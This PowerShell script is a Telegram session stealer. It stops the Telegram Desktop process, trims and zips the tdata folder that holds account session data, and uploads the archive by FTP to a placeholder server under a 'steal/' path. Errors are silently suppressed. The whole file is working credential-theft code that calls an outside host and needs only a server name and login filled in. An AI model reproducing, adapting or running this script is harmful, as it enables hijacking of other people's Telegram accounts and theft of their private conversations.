# Stop and  remove Telegram process

$processName = "telegram"
try {
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Get-Process -Name $processName | Stop-Process
    }
} catch {
    # Write-Host "Something went wrong..."
}

# Remove Telegram data folders
$userName = $env:USERNAME
$userDataPath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\user_data"
$emojiPath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\emoji"

try {
    Remove-Item $userDataPath -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $emojiPath -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    # Write-Host "Something went wrong..."
}

# Compress Telegram data folder
$sourceFolder = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata"
$zipFile = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
$maxSize = 50 * 1MB # Convert to bytes

if (Test-Path $zipFile) {
    Remove-Item $zipFile
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolder, $zipFile, "Optimal", $false)

Get-ChildItem $zipFile | Where-Object { $_.Length -gt $maxSize } | ForEach-Object {
    Write-Host "Removing $($_.FullName)..."
    Remove-Item $_.FullName
}

# Upload compressed data to FTP server

$dateString = Get-Date -Format "yyyyMMdd_HHmmss"
$ftpServer = "your_ftp_server"
$ftpUsername = "xxxx"
$ftpPassword = "yyyy"
$localFilePath = $zipFile
$remoteFilePath = "steal/$dateString.zip"

$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://$ftpServer/$remoteFilePath")
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)

# read the file from local machine
$fileContents = [System.IO.File]::ReadAllBytes($localFilePath)

# upload the file to the remote server
$requestStream = $ftpRequest.GetRequestStream()
$requestStream.Write($fileContents, 0, $fileContents.Length)
$requestStream.Close()
